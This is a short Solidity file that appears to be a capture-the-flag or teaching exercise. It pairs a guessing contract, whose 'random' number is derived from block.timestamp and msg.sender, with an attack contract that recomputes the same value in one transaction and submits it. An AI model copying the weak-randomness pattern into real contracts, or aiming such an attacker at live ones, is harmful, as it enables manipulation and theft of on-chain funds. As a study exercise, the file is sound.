// SPDX-License-Identifier: MIT

pragma solidity ^0.8.10;

contract EducatedGuess {
    bool public correctGuess;

    function random(uint256 guess) public {
        uint256 randomnumber = uint256(keccak256(abi.encodePacked(block.timestamp, msg.sender))) % 1000;
        require(guess == randomnumber, "Your guess is incorrect");
        correctGuess = true;
    }
}

contract HackEducatedGuess {
    EducatedGuess target;

    function attack(address _target , address attackerContract, uint num) public returns (uint256) {
        target = EducatedGuess(_target);
        uint256 _randomnumber = uint256(keccak256(abi.encodePacked(block.timestamp, attackerContract))) % num;
        target.random(_randomnumber);
        return _randomnumber;
    }
}
